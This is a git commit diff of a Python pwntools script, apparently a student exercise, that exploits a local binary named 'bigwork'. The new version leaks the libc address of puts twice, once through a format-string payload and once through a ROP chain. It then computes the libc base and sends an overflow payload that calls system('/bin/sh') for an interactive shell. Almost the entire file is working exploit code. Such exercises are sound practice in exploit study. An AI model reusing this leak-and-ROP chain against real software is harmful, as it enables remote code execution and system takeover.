d3734c857c168043fb40b2ccc5326da08e6d0664
xhhxbg <gsoead@hotmail.com>
2022-11-23 18:31:48 +0800

    ret2libc done

--- scripts/3_ret2libc.py
+++ scripts/3_ret2libc.py
@@ -1,44 +1,47 @@
-# # ret2libc
-# from pwn import *
-
-# p = process('../src/bigwork')
-# elf = ELF('../src/bigwork')
-# # gef> b overflow
-# # gef> b* 0x401326
-# # gef> attach [pid]
-# # gef> c
-
-# p.sendline("1".encode())
-# # gef> print system
-# print('get sys_addr by "print system": ', end='')
-# sys_addr = eval(input())
-# # gef> print __libc_start_main
-# print('get mainaddr by "print __libc_start_main": ', end='')
-# mainaddr = eval(input())
-# print(f'get binsh_addr by "find {mainaddr},+2200000,"/bin/sh"": ', end='')
-# # gef> find 0xmainaddr,+2200000,"/bin/sh"
-# binsh_addr = eval(input())
-
-# pyload = ('a' * 0x30 + 'b' * 0x08).encode() + p64(sys_addr) + ('b' * 8).encode() + p64(binsh_addr)
-# p.sendline(pyload)
-# p.interactive()
-
-# ret2libc
 from pwn import *
-from LibcSearcher import LibcSearcher
+# context.log_level = 'debug'
 
 sh = process('../src/bigwork')
 elf = ELF('../src/bigwork')
 
 puts_plt = elf.plt['puts']
-libc_start_main_got = elf.got['__libc_start_main']
-main = elf.symbols['main']
+puts_got = elf.got['puts']
+main_addr = 0x401329
+pop_rdi_ret = 0x0401453
 
+# 泄露方法 1
+sh.sendline('2'.encode())
 sh.recv()
+pyload = 'aaaa%7$s'.encode() + p64(puts_got) 
+sh.sendline(pyload)
+puts_real = u64(sh.recv()[10: 16] + '\x00\x00'.encode())  
+print(hex(puts_real))
 
-pyload = ('a' * 0x38).encode() + p64(puts_plt) + p64(main) + p64(libc_start_main_got)
-sh.sendline("1".encode())
-sh.sendlineafter("Which country do you live in?\n", pyload)
-print(sh.recv())
+# 泄露方法 2
+sh.sendline('1'.encode())
+sh.recv()
+pyload1 = ('a' * 0x30 + 'b' * 0x08).encode()
+pyload1 += p64(pop_rdi_ret)  # 跳转地址
+pyload1 += p64(puts_got)     # 参数
+pyload1 += p64(puts_plt)     # 跳转函数
+pyload1 += p64(main_addr)    # 返回地址
+sh.sendline(pyload1)
+puts_real = u64(sh.recv()[0x40: 0x46] + '\x00\x00'.encode())
+print(hex(puts_real))
 
-# libc_start_main_addr = u32(sh.recv()[0: 8])
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+libc_base = puts_real - libc.symbols['puts']
+system_addr = libc_base + libc.symbols['system']
+bin_sh_addr = libc_base + libc.search('/bin/sh'.encode()).__next__()
+
+
+sh.sendline('1'.encode())
+pyload2 = ('a' * 0x30 + 'b' * 0x08).encode()
+pyload2 += p64(0x40101a) 
+pyload2 += p64(pop_rdi_ret)  # 跳转地址
+pyload2 += p64(bin_sh_addr)  # 参数
+pyload2 += p64(system_addr)  # 跳转函数
+pyload2 += p64(main_addr)    # 返回地址
+sh.sendline(pyload2)
+
+sh.interactive()
